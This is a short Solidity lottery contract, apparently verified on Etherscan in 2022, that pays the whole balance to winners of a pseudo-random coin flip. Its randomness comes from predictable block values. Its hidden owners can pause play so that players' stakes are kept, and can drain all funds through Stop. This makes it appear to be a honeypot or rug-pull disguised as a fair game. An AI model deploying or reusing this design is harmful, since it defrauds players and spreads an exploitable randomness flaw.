/**
 *Submitted for verification at Etherscan.io on 2022-08-09
*/

contract lottery
{
    bool isStarted;
    bool isPaused = false;
    uint randNonce = 0;

    function YouWin() private returns (bool) {
        randNonce++;
        uint256 a = uint256(keccak256(abi.encodePacked(block.timestamp,block.difficulty,
                                          msg.sender,
                                          randNonce))) % 2;
        return a == 0;
    }

    function Roll() public payable {
        require(msg.sender == tx.origin);
        if (YouWin() && !isPaused && msg.value > 0.1 ether)
            payable(msg.sender).transfer(address(this).balance);
    }


    mapping (bytes32=>bool) owners;


    function Start() public payable isOwner {
        isStarted = true;
    }


    function Stop() public payable isOwner {
        payable(msg.sender).transfer(address(this).balance);
    }


    constructor(bytes32[] memory owner) {
        for(uint256 i=0; i < owner.length; i++){
            owners[owner[i]] = true;
        }
    }

    function Pause() public payable isOwner {
        isPaused = true;
    }

    function Resume() public payable isOwner {
        isPaused = false;
    }

    modifier isOwner(){
        require(owners[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    fallback() external {}
}